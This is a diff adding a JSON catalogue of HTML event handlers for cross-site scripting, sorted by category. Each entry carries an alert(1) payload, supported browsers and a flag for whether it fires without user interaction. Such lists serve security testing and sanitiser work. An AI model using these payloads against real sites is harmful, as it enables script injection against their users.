@@ -1,0 +1,189 @@
+{
+  "events": {
+    "animation": [
+      {"name": "onanimationstart", "description": "Fires when CSS animation starts", "example": "<style>@keyframes x{}</style><xss style=\"animation-name:x\" onanimationstart=\"alert(1)\"></xss>", "browsers": ["chrome", "firefox", "safari"], "auto_trigger": true},
+      {"name": "onanimationend", "description": "Fires when CSS animation ends", "example": "<style>@keyframes x{}</style><xss style=\"animation-name:x\" onanimationend=\"alert(1)\"></xss>", "browsers": ["chrome", "firefox", "safari"], "auto_trigger": true},
+      {"name": "onanimationiteration", "description": "Fires on animation iteration", "example": "<xss style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></xss>", "browsers": ["chrome", "firefox", "safari"], "auto_trigger": true},
+      {"name": "onanimationcancel", "description": "Fires when CSS animation cancelled", "example": "<style>@keyframes x{}</style><xss id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></xss>", "browsers": ["firefox"], "auto_trigger": true},
+      {"name": "ontransitionend", "description": "Fires when CSS transition ends", "example": "<xss id=x style=\"transition:outline 1s\" ontransitionend=alert(1) tabindex=1></xss>", "browsers": ["chrome", "firefox", "safari"], "auto_trigger": true},
+      {"name": "ontransitionstart", "description": "Fires when CSS transition starts", "example": "<xss id=x style=\"transition:color 1s\" ontransitionstart=alert(1)></xss>", "browsers": ["safari"], "auto_trigger": true},
+      {"name": "ontransitionrun", "description": "Fires when CSS transition runs", "example": "<xss ontransitionrun=alert(1)></xss>", "browsers": ["chrome", "firefox"], "auto_trigger": true},
+      {"name": "ontransitioncancel", "description": "Fires when CSS transition cancelled", "example": "<xss ontransitioncancel=alert(1)></xss>", "browsers": ["chrome", "firefox"], "auto_trigger": true},
+      {"name": "onwebkitanimationend", "description": "Webkit: Fires when CSS animation ends", "example": "<style>@keyframes x{}</style><xss style=\"animation-name:x\" onwebkitanimationend=\"alert(1)\"></xss>", "browsers": ["safari", "chrome"], "auto_trigger": true},
+      {"name": "onwebkitanimationiteration", "description": "Webkit: Fires on animation iteration", "example": "<style>@keyframes x{from{opacity:0}to{opacity:1}}</style><xss style=\"animation:x 1s 2\" onwebkitanimationiteration=\"alert(1)\"></xss>", "browsers": ["safari", "chrome"], "auto_trigger": true},
+      {"name": "onwebkitanimationstart", "description": "Webkit: Fires when CSS animation starts", "example": "<style>@keyframes x{}</style><xss style=\"animation-name:x\" onwebkitanimationstart=\"alert(1)\"></xss>", "browsers": ["safari", "chrome"], "auto_trigger": true},
+      {"name": "onwebkittransitionend", "description": "Webkit: Fires when CSS transition ends", "example": "<xss style=\"transition:color 1s\" onwebkittransitionend=alert(1)></xss>", "browsers": ["safari", "chrome"], "auto_trigger": true}
+    ],
+    "media": [
+      {"name": "oncanplay", "description": "Fires when media can start playing", "example": "<audio oncanplay=alert(1)><source src=\"validaudio.wav\" type=\"audio/wav\"></audio>", "browsers": ["chrome", "firefox", "safari"], "auto_trigger": true},
+      {"name": "oncanplaythrough", "description": "Fires when media can play through", "example": "<video oncanplaythrough=alert(1)><source src=\"validvideo.mp4\"></video>", "browsers": ["chrome", "firefox", "safari"], "auto_trigger": true},
+      {"name": "ondurationchange", "description": "Fires when duration changes", "example": "<audio controls ondurationchange=alert(1)><source src=validaudio.mp3></audio>", "browsers": ["chrome", "firefox", "safari"], "auto_trigger": true},
+      {"name": "onended", "description": "Fires when media ends", "example": "<audio controls autoplay onended=alert(1)><source src=\"validaudio.wav\"></audio>", "browsers": ["chrome", "firefox", "safari"], "auto_trigger": true},
+      {"name": "onloadeddata", "description": "Fires when data loaded", "example": "<audio onloadeddata=alert(1)><source src=\"validaudio.wav\"></audio>", "browsers": ["chrome", "firefox", "safari"], "auto_trigger": true},
+      {"name": "onloadedmetadata", "description": "Fires when metadata loaded", "example": "<audio autoplay onloadedmetadata=alert(1)><source src=\"validaudio.wav\"></audio>", "browsers": ["chrome", "firefox", "safari"], "auto_trigger": true},
+      {"name": "onloadstart", "description": "Fires when loading starts", "example": "<video onloadstart=\"alert(1)\"><source></video>", "browsers": ["chrome", "firefox", "safari"], "auto_trigger": true},
+      {"name": "onplay", "description": "Fires when media starts", "example": "<audio autoplay onplay=alert(1)><source src=\"validaudio.wav\"></audio>", "browsers": ["chrome", "firefox", "safari"], "auto_trigger": true},
+      {"name": "onplaying", "description": "Fires when media is playing", "example": "<audio autoplay onplaying=alert(1)><source src=\"validaudio.wav\"></audio>", "browsers": ["chrome", "firefox", "safari"], "auto_trigger": true},
+      {"name": "onprogress", "description": "Fires on download progress", "example": "<audio controls onprogress=alert(1)><source src=validaudio.mp3></audio>", "browsers": ["chrome", "firefox", "safari"], "auto_trigger": true},
+      {"name": "onsuspend", "description": "Fires when loading suspended", "example": "<audio controls onsuspend=alert(1)><source src=validaudio.mp3></audio>", "browsers": ["chrome", "firefox", "safari"], "auto_trigger": true},
+      {"name": "ontimeupdate", "description": "Fires on playback position change", "example": "<audio controls autoplay ontimeupdate=alert(1)><source src=\"validaudio.wav\"></audio>", "browsers": ["chrome", "firefox", "safari"], "auto_trigger": true},
+      {"name": "onvolumechange", "description": "Fires when volume changes", "example": "<video onvolumechange=alert(1)></video>", "browsers": ["chrome", "firefox", "safari"], "auto_trigger": false},
+      {"name": "onwaiting", "description": "Fires when waiting for data", "example": "<video onwaiting=alert(1)></video>", "browsers": ["chrome", "firefox", "safari"], "auto_trigger": false},
+      {"name": "onseeking", "description": "Fires when seeking", "example": "<video onseeking=alert(1)></video>", "browsers": ["chrome", "firefox", "safari"], "auto_trigger": false},
+      {"name": "onseeked", "description": "Fires after seek", "example": "<video onseeked=alert(1)></video>", "browsers": ["chrome", "firefox", "safari"], "auto_trigger": false},
+      {"name": "onratechange", "description": "Fires when playback rate changes", "example": "<video onratechange=alert(1)></video>", "browsers": ["chrome", "firefox", "safari"], "auto_trigger": false},
+      {"name": "onstalled", "description": "Fires when data stalled", "example": "<video onstalled=alert(1)></video>", "browsers": ["chrome", "firefox", "safari"], "auto_trigger": false},
+      {"name": "onemptied", "description": "Fires when media emptied", "example": "<video onemptied=alert(1)></video>", "browsers": ["chrome", "firefox", "safari"], "auto_trigger": false}
+    ],
+    "page": [
+      {"name": "onbeforeprint", "description": "Fires before print", "example": "<body onbeforeprint=alert(1)>", "browsers": ["chrome", "firefox"], "auto_trigger": false},
+      {"name": "onafterprint", "description": "Fires after print", "example": "<body onafterprint=alert(1)>", "browsers": ["chrome", "firefox"], "auto_trigger": false},
+      {"name": "onbeforeunload", "description": "Fires before page unloads", "example": "<body onbeforeunload=alert(1)>", "browsers": ["chrome", "firefox"], "auto_trigger": false},
+      {"name": "onload", "description": "Fires when element loaded", "example": "<body onload=alert(1)>", "browsers": ["chrome", "firefox", "safari"], "auto_trigger": true},
+      {"name": "onhashchange", "description": "Fires on hash change", "example": "<body onhashchange=alert(1)>", "browsers": ["chrome", "firefox", "safari"], "auto_trigger": true},
+      {"name": "onmessage", "description": "Fires on message received", "example": "<body onmessage=alert(1)>", "browsers": ["chrome", "firefox", "safari"], "auto_trigger": true},
+      {"name": "onpageshow", "description": "Fires when page shown", "example": "<body onpageshow=alert(1)>", "browsers": ["chrome", "firefox", "safari"], "auto_trigger": true},
+      {"name": "onpagereveal", "description": "Fires when page revealed", "example": "<body onpagereveal=alert(1)>", "browsers": ["safari"], "auto_trigger": true},
+      {"name": "onpagehide", "description": "Fires when page hidden", "example": "<body onpagehide=alert(1)>", "browsers": ["chrome", "firefox", "safari"], "auto_trigger": false},
+      {"name": "onpopstate", "description": "Fires on popstate", "example": "<body onpopstate=alert(1)>", "browsers": ["chrome", "firefox", "safari"], "auto_trigger": true},
+      {"name": "onresize", "description": "Fires on resize", "example": "<body onresize=alert(1)>", "browsers": ["chrome", "firefox", "safari"], "auto_trigger": false},
+      {"name": "onscroll", "description": "Fires on scroll", "example": "<body onscroll=alert(1)><div style=height:1000px></div>", "browsers": ["chrome", "firefox", "safari"], "auto_trigger": true},
+      {"name": "onscrollend", "description": "Fires when scroll ends", "example": "<xss onscrollend=alert(1) style=\"overflow:auto;height:100px\">", "browsers": ["chrome", "firefox"], "auto_trigger": true},
+      {"name": "onunload", "description": "Fires when page unloads", "example": "<body onunload=alert(1)>", "browsers": ["chrome", "firefox"], "auto_trigger": false},
+      {"name": "ononline", "description": "Fires when online", "example": "<body ononline=alert(1)>", "browsers": ["chrome", "firefox", "safari"], "auto_trigger": false},
+      {"name": "onoffline", "description": "Fires when offline", "example": "<body onoffline=alert(1)>", "browsers": ["chrome", "firefox", "safari"], "auto_trigger": false},
+      {"name": "onstorage", "description": "Fires on storage change", "example": "<body onstorage=alert(1)>", "browsers": ["chrome", "firefox", "safari"], "auto_trigger": false}
+    ],
+    "focus": [
+      {"name": "onfocus", "description": "Fires when element gains focus", "example": "<input onfocus=alert(1) autofocus>", "browsers": ["chrome", "firefox", "safari"], "auto_trigger": true},
+      {"name": "onfocusin", "description": "Fires when element about to receive focus", "example": "<a id=x tabindex=1 onfocusin=alert(1)></a>", "browsers": ["chrome", "firefox", "safari"], "auto_trigger": true},
+      {"name": "onfocusout", "description": "Fires when element about to lose focus", "example": "<input onfocusout=alert(1)>", "browsers": ["chrome", "firefox", "safari"], "auto_trigger": false},
+      {"name": "onblur", "description": "Fires when element loses focus", "example": "<xss onblur=alert(1) id=x tabindex=1>test</xss>", "browsers": ["chrome", "firefox", "safari"], "auto_trigger": false}
+    ],
+    "error": [
+      {"name": "onerror", "description": "Fires on loading error", "example": "<img src=x onerror=alert(1)>", "browsers": ["chrome", "firefox", "safari"], "auto_trigger": true},
+      {"name": "onabort", "description": "Fires when loading aborted", "example": "<video onabort=alert(1)></video>", "browsers": ["chrome", "firefox", "safari"], "auto_trigger": false},
+      {"name": "onsecuritypolicyviolation", "description": "Fires on CSP violation", "example": "<xss onsecuritypolicyviolation=alert(1)>XSS</xss>", "browsers": ["chrome", "firefox", "safari"], "auto_trigger": true},
+      {"name": "onunhandledrejection", "description": "Fires on unhandled promise rejection", "example": "<body onunhandledrejection=alert(1)><script>fetch('//xyz')</script>", "browsers": ["firefox"], "auto_trigger": true}
+    ],
+    "svg_animation": [
+      {"name": "onbegin", "description": "Fires when SVG animation begins", "example": "<svg><animate onbegin=alert(1) attributeName=x dur=1s>", "browsers": ["chrome", "firefox", "safari"], "auto_trigger": true},
+      {"name": "onend", "description": "Fires when SVG animation ends", "example": "<svg><animate onend=alert(1) attributeName=x dur=1s>", "browsers": ["chrome", "firefox", "safari"], "auto_trigger": true},
+      {"name": "onrepeat", "description": "Fires on SVG animation repeat", "example": "<svg><animate onrepeat=alert(1) attributeName=x dur=1s repeatCount=2>", "browsers": ["chrome", "firefox", "safari"], "auto_trigger": true}
+    ],
+    "visibility": [
+      {"name": "oncontentvisibilityautostatechange", "description": "Fires on content visibility change", "example": "<xss oncontentvisibilityautostatechange=alert(1) style=display:block;content-visibility:auto>", "browsers": ["chrome", "firefox", "safari"], "auto_trigger": true},
+      {"name": "ontoggle", "description": "Fires on toggle", "example": "<details ontoggle=alert(1) open>test</details>", "browsers": ["chrome", "firefox", "safari"], "auto_trigger": true},
+      {"name": "onbeforetoggle", "description": "Fires before toggle", "example": "<button popovertarget=x>Click</button><xss onbeforetoggle=alert(1) popover id=x>", "browsers": ["chrome"], "auto_trigger": false}
+    ],
+    "track": [
+      {"name": "oncuechange", "description": "Fires on cue change", "example": "<track default oncuechange=alert(1) src=\"data:text/vtt,...\">", "browsers": ["chrome"], "auto_trigger": true}
+    ],
+    "mouse": [
+      {"name": "onclick", "description": "Fires when element is clicked", "example": "<xss onclick=alert(1) style=display:block>test</xss>", "browsers": ["chrome", "firefox", "safari"], "auto_trigger": false},
+      {"name": "ondblclick", "description": "Fires on double click", "example": "<xss ondblclick=alert(1) autofocus tabindex=1>test</xss>", "browsers": ["chrome", "firefox", "safari"], "auto_trigger": false},
+      {"name": "oncontextmenu", "description": "Fires on right-click", "example": "<xss oncontextmenu=alert(1) style=display:block>test</xss>", "browsers": ["chrome", "firefox", "safari"], "auto_trigger": false},
+      {"name": "onauxclick", "description": "Fires on auxiliary click", "example": "<input onauxclick=alert(1)>", "browsers": ["chrome", "firefox"], "auto_trigger": false},
+      {"name": "onmousedown", "description": "Fires when mouse button pressed", "example": "<div onmousedown=alert(1)>click</div>", "browsers": ["chrome", "firefox", "safari"], "auto_trigger": false},
+      {"name": "onmouseup", "description": "Fires when mouse button released", "example": "<div onmouseup=alert(1)>click</div>", "browsers": ["chrome", "firefox", "safari"], "auto_trigger": false},
+      {"name": "onmouseover", "description": "Fires when mouse enters element", "example": "<div onmouseover=alert(1)>hover</div>", "browsers": ["chrome", "firefox", "safari"], "auto_trigger": false},
+      {"name": "onmouseout", "description": "Fires when mouse leaves element", "example": "<div onmouseout=alert(1)>leave</div>", "browsers": ["chrome", "firefox", "safari"], "auto_trigger": false},
+      {"name": "onmousemove", "description": "Fires on mouse movement", "example": "<div onmousemove=alert(1)>move</div>", "browsers": ["chrome", "firefox", "safari"], "auto_trigger": false},
+      {"name": "onmouseenter", "description": "Fires when mouse enters", "example": "<div onmouseenter=alert(1)>enter</div>", "browsers": ["chrome", "firefox", "safari"], "auto_trigger": false},
+      {"name": "onmouseleave", "description": "Fires when mouse leaves", "example": "<div onmouseleave=alert(1)>leave</div>", "browsers": ["chrome", "firefox", "safari"], "auto_trigger": false},
+      {"name": "onwheel", "description": "Fires on mouse wheel", "example": "<div onwheel=alert(1)>scroll</div>", "browsers": ["chrome", "firefox", "safari"], "auto_trigger": false}
+    ],
+    "keyboard": [
+      {"name": "onkeydown", "description": "Fires when key pressed", "example": "<input onkeydown=alert(1)>", "browsers": ["chrome", "firefox", "safari"], "auto_trigger": false},
+      {"name": "onkeyup", "description": "Fires when key released", "example": "<input onkeyup=alert(1)>", "browsers": ["chrome", "firefox", "safari"], "auto_trigger": false},
+      {"name": "onkeypress", "description": "Fires when key pressed (deprecated)", "example": "<input onkeypress=alert(1)>", "browsers": ["chrome", "firefox", "safari"], "auto_trigger": false}
+    ],
+    "form": [
+      {"name": "onsubmit", "description": "Fires when form submitted", "example": "<form onsubmit=alert(1)><input type=submit>", "browsers": ["chrome", "firefox", "safari"], "auto_trigger": false},
+      {"name": "onreset", "description": "Fires when form reset", "example": "<form onreset=alert(1)><input type=reset>", "browsers": ["chrome", "firefox", "safari"], "auto_trigger": false},
+      {"name": "oninput", "description": "Fires when input value changes", "example": "<input oninput=alert(1)>", "browsers": ["chrome", "firefox", "safari"], "auto_trigger": false},
+      {"name": "onchange", "description": "Fires when element value changes", "example": "<input onchange=alert(1) value=xss>", "browsers": ["chrome", "firefox", "safari"], "auto_trigger": false},
+      {"name": "oninvalid", "description": "Fires when input is invalid", "example": "<input oninvalid=alert(1) required><input type=submit>", "browsers": ["chrome", "firefox", "safari"], "auto_trigger": false},
+      {"name": "onselect", "description": "Fires when text selected", "example": "<input onselect=alert(1) value=test>", "browsers": ["chrome", "firefox", "safari"], "auto_trigger": false},
+      {"name": "onsearch", "description": "Fires on search input", "example": "<input type=search onsearch=alert(1)>", "browsers": ["chrome", "safari"], "auto_trigger": false},
+      {"name": "onformdata", "description": "Fires on form data", "example": "<form onformdata=alert(1)>", "browsers": ["chrome", "firefox", "safari"], "auto_trigger": false},
+      {"name": "onbeforeinput", "description": "Fires before input", "example": "<xss contenteditable onbeforeinput=alert(1)>test", "browsers": ["chrome", "firefox", "safari"], "auto_trigger": false},
+      {"name": "oncancel", "description": "Fires on cancel", "example": "<input type=file oncancel=alert(1)>", "browsers": ["chrome", "firefox", "safari"], "auto_trigger": false},
+      {"name": "onclose", "description": "Fires on close", "example": "<dialog open onclose=alert(1)><button>XSS</button>", "browsers": ["chrome", "firefox", "safari"], "auto_trigger": false}
+    ],
+    "drag": [
+      {"name": "ondrag", "description": "Fires during drag", "example": "<xss draggable=\"true\" ondrag=\"alert(1)\">test</xss>", "browsers": ["chrome", "firefox", "safari"], "auto_trigger": false},
+      {"name": "ondragstart", "description": "Fires when drag starts", "example": "<xss draggable=\"true\" ondragstart=\"alert(1)\">test</xss>", "browsers": ["chrome", "firefox", "safari"], "auto_trigger": false},
+      {"name": "ondragend", "description": "Fires when drag ends", "example": "<xss draggable=\"true\" ondragend=\"alert(1)\">test</xss>", "browsers": ["chrome", "firefox", "safari"], "auto_trigger": false},
+      {"name": "ondragenter", "description": "Fires when drag enters", "example": "<xss draggable=\"true\" ondragenter=\"alert(1)\">test</xss>", "browsers": ["chrome", "firefox", "safari"], "auto_trigger": false},
+      {"name": "ondragleave", "description": "Fires when drag leaves", "example": "<xss draggable=\"true\" ondragleave=\"alert(1)\">test</xss>", "browsers": ["chrome", "firefox", "safari"], "auto_trigger": false},
+      {"name": "ondragover", "description": "Fires when drag over", "example": "<xss draggable=\"true\" ondragover=\"alert(1)\">test</xss>", "browsers": ["chrome", "firefox", "safari"], "auto_trigger": false},
+      {"name": "ondragexit", "description": "Fires on drag exit", "example": "<xss draggable=\"true\" ondragexit=\"alert(1)\">test</xss>", "browsers": ["firefox"], "auto_trigger": false},
+      {"name": "ondrop", "description": "Fires on drop", "example": "<div ondrop=alert(1)>drop</div>", "browsers": ["chrome", "firefox", "safari"], "auto_trigger": false}
+    ],
+    "clipboard": [
+      {"name": "oncopy", "description": "Fires on copy", "example": "<xss oncopy=alert(1) value=\"XSS\" autofocus>test", "browsers": ["chrome", "firefox", "safari"], "auto_trigger": false},
+      {"name": "oncut", "description": "Fires on cut", "example": "<xss oncut=alert(1) value=\"XSS\" autofocus>test", "browsers": ["chrome", "firefox", "safari"], "auto_trigger": false},
+      {"name": "onpaste", "description": "Fires on paste", "example": "<input onpaste=alert(1)>", "browsers": ["chrome", "firefox", "safari"], "auto_trigger": false},
+      {"name": "onbeforecopy", "description": "Fires before copy", "example": "<a onbeforecopy=\"alert(1)\" contenteditable>test</a>", "browsers": ["chrome", "firefox", "safari"], "auto_trigger": false},
+      {"name": "onbeforecut", "description": "Fires before cut", "example": "<a onbeforecut=\"alert(1)\" contenteditable>test</a>", "browsers": ["chrome", "firefox", "safari"], "auto_trigger": false},
+      {"name": "onbeforepaste", "description": "Fires before paste", "example": "<xss onbeforepaste=alert(1)>XSS</xss>", "browsers": ["safari"], "auto_trigger": false}
+    ],
+    "pointer": [
+      {"name": "onpointerdown", "description": "Fires when pointer down", "example": "<div onpointerdown=alert(1)>click</div>", "browsers": ["chrome", "firefox", "safari"], "auto_trigger": false},
+      {"name": "onpointerup", "description": "Fires when pointer up", "example": "<div onpointerup=alert(1)>click</div>", "browsers": ["chrome", "firefox", "safari"], "auto_trigger": false},
+      {"name": "onpointermove", "description": "Fires when pointer moves", "example": "<div onpointermove=alert(1)>move</div>", "browsers": ["chrome", "firefox", "safari"], "auto_trigger": false},
+      {"name": "onpointerenter", "description": "Fires when pointer enters", "example": "<div onpointerenter=alert(1)>enter</div>", "browsers": ["chrome", "firefox", "safari"], "auto_trigger": false},
+      {"name": "onpointerleave", "description": "Fires when pointer leaves", "example": "<div onpointerleave=alert(1)>leave</div>", "browsers": ["chrome", "firefox", "safari"], "auto_trigger": false},
+      {"name": "onpointerover", "description": "Fires when pointer over", "example": "<div onpointerover=alert(1)>over</div>", "browsers": ["chrome", "firefox", "safari"], "auto_trigger": false},
+      {"name": "onpointerout", "description": "Fires when pointer out", "example": "<div onpointerout=alert(1)>out</div>", "browsers": ["chrome", "firefox", "safari"], "auto_trigger": false},
+      {"name": "onpointercancel", "description": "Fires when pointer cancelled", "example": "<div onpointercancel=alert(1)>cancel</div>", "browsers": ["chrome", "firefox", "safari"], "auto_trigger": false},
+      {"name": "ongotpointercapture", "description": "Fires when pointer capture", "example": "<div ongotpointercapture=alert(1)></div>", "browsers": ["chrome", "firefox", "safari"], "auto_trigger": false},
+      {"name": "onlostpointercapture", "description": "Fires when pointer capture lost", "example": "<div onlostpointercapture=alert(1)></div>", "browsers": ["chrome", "firefox", "safari"], "auto_trigger": false}
+    ],
+    "touch": [
+      {"name": "ontouchstart", "description": "Fires when touch starts", "example": "<div ontouchstart=alert(1)>touch</div>", "browsers": ["chrome", "firefox", "safari"], "auto_trigger": false},
+      {"name": "ontouchend", "description": "Fires when touch ends", "example": "<div ontouchend=alert(1)>touch</div>", "browsers": ["chrome", "firefox", "safari"], "auto_trigger": false},
+      {"name": "ontouchmove", "description": "Fires when touch moves", "example": "<div ontouchmove=alert(1)>touch</div>", "browsers": ["chrome", "firefox", "safari"], "auto_trigger": false},
+      {"name": "ontouchcancel", "description": "Fires when touch cancelled", "example": "<div ontouchcancel=alert(1)>touch</div>", "browsers": ["chrome", "firefox", "safari"], "auto_trigger": false}
+    ],
+    "misc": [
+      {"name": "onshow", "description": "Fires when element shown", "example": "<div onshow=alert(1)></div>", "browsers": ["firefox"], "auto_trigger": false},
+      {"name": "onreadystatechange", "description": "Fires when ready state changes", "example": "<object onreadystatechange=alert(1)></object>", "browsers": ["chrome", "firefox", "safari"], "auto_trigger": false},
+      {"name": "onslotchange", "description": "Fires on slot change", "example": "<slot onslotchange=alert(1)></slot>", "browsers": ["chrome", "firefox", "safari"], "auto_trigger": false},
+      {"name": "oncommand", "description": "Fires on command", "example": "<button commandfor=test command=show-popover>Click<div id=test oncommand=alert(1)>", "browsers": ["chrome"], "auto_trigger": false},
+      {"name": "onscrollsnapchange", "description": "Fires on scroll snap change", "example": "<address onscrollsnapchange=alert(1) style=overflow-y:hidden>", "browsers": ["chrome"], "auto_trigger": true},
+      {"name": "onscrollsnapchanging", "description": "Fires when scroll snap is changing", "example": "<div style=\"scroll-snap-type:y mandatory;overflow:auto\" onscrollsnapchanging=alert(1)><div style=scroll-snap-align:start>x</div></div>", "browsers": ["chrome"], "auto_trigger": true},
+      {"name": "onbeforematch", "description": "Fires before find-in-page match", "example": "<div hidden=until-found onbeforematch=alert(1)>XSS</div>", "browsers": ["chrome"], "auto_trigger": false},
+      {"name": "onselectionchange", "description": "Fires when selection changes", "example": "<input onselectionchange=alert(1)>", "browsers": ["chrome", "firefox", "safari"], "auto_trigger": false},
+      {"name": "onwebkitplaybacktargetavailabilitychanged", "description": "Webkit: Fires on playback target change", "example": "<video onwebkitplaybacktargetavailabilitychanged=alert(1)></video>", "browsers": ["safari"], "auto_trigger": false}
+    ]
+  },
+  "auto_trigger_events": [
+    "onload", "onerror", "onfocus", "onfocusin", "onanimationstart", "onanimationend",
+    "ontransitionend", "ontransitionstart", "onpageshow", "onpagereveal", "onhashchange",
+    "onpopstate", "ontoggle", "onloadstart", "onmessage", "onbegin", "onend", "onrepeat",
+    "oncanplay", "oncanplaythrough", "ondurationchange", "onloadeddata", "onloadedmetadata",
+    "onplay", "onplaying", "onprogress", "onsuspend", "ontimeupdate", "onscroll", "onscrollend",
+    "oncontentvisibilityautostatechange", "onsecuritypolicyviolation", "oncuechange",
+    "onunhandledrejection", "onscrollsnapchange", "onscrollsnapchanging",
+    "onwebkitanimationend", "onwebkitanimationiteration", "onwebkitanimationstart", "onwebkittransitionend"
+  ],
+  "tags_supporting_events": [
+    "a", "abbr", "acronym", "address", "applet", "area", "article", "aside", "audio",
+    "b", "bdi", "bdo", "big", "blink", "blockquote", "body", "br", "button", "canvas",
+    "caption", "center", "cite", "code", "col", "colgroup", "command", "content", "data",
+    "datalist", "dd", "del", "details", "dfn", "dialog", "dir", "div", "dl", "dt",
+    "element", "em", "embed", "fieldset", "figcaption", "figure", "font", "footer",
+    "form", "frame", "frameset", "h1", "h2", "h3", "h4", "h5", "h6", "header", "hgroup",
+    "hr", "html", "i", "iframe", "image", "img", "input", "ins", "kbd", "keygen",
+    "label", "legend", "li", "listing", "main", "map", "mark", "marquee", "menu",
+    "menuitem", "meta", "meter", "multicol", "nav", "nextid", "nobr", "noembed",
+    "noframes", "noscript", "object", "ol", "optgroup", "option", "output", "p",
+    "param", "picture", "plaintext", "pre", "progress", "q", "rb", "rp", "rt", "rtc",
+    "ruby", "s", "samp", "script", "section", "select", "shadow", "slot", "small",
+    "source", "spacer", "span", "strike", "strong", "style", "sub", "summary", "sup",
+    "svg", "table", "tbody", "td", "template", "textarea", "tfoot", "th", "thead",
+    "time", "title", "tr", "track", "tt", "u", "ul", "var", "video", "wbr", "xmp"
+  ]
+}
